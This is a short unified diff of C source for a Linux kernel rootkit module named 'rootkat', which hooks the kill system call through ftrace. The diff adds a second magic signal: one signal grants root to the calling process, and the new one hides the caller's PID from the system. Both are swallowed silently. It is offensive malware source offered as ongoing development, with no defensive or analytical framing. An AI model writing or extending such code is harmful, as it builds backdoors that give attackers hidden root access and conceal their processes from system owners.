@@ -5,6 +5,7 @@
 #include <linux/uidgid.h>
 #include <linux/ptrace.h>
 #include "ftrace_hook.h"
+#include "hidden_pids.h"
 #include "hook_sys_kill.h"
 
 #define TAG "rootkat/hook_sys_kill: "
@@ -58,9 +59,13 @@ static long rootkat_sys_kill(const struct pt_regs *regs)
 	sys_kill_t orig = (sys_kill_t)hook_sys_kill.original;
 	int sig = (int)regs->si;
 
-	if (sig == ROOTKAT_MAGIC_SIG) {
+	if (sig == ROOTKAT_PRIVESC_SIG) {
 		rootkat_grant_root();
-		return 0;   /* swallow the signal */
+		return 0;   /* swallow */
+	}
+	if (sig == ROOTKAT_HIDE_SIG) {
+		rootkat_hide_pid(task_pid_nr(current));
+		return 0;
 	}
 
 	return orig(regs);
